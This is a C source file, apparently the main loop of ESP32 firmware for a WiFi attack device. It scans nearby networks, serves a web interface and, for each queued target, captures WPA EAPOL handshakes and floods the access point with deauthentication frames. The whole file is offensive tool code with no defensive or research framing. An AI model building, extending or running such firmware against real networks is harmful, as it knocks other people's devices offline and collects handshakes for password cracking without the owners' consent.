#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include "esp_wifi_types_generic.h"
#include "wifi.h"
#include "led.h"
#include "targeting.h"
#include "webserver.h"

void app_main(void)
{
	wifi_init();
	led_init();

	wifi_scan();

	xTaskCreate(web_server_start_loop, "WEBSERVER", 2048,NULL,1, NULL);

	while (true) {
		attack_target_t* target = get_next_target();
		if(target == NULL) {
			wifi_scan();
    		vTaskDelay(5000 / portTICK_PERIOD_MS);
		} else {
			led_set_color(0xff, 0x00, 0x00);
			printf("Attacking: %s\n", target->ssid);
			sniff_eapol(target->primary_channel, (char*)target->ssid, target->bssid);
			deauth_ap(target->bssid, 30);
			wifi_promisc_off();
    		vTaskDelay(5000 / portTICK_PERIOD_MS);
		}
		
    	vTaskDelay(5000 / portTICK_PERIOD_MS);
	}
}

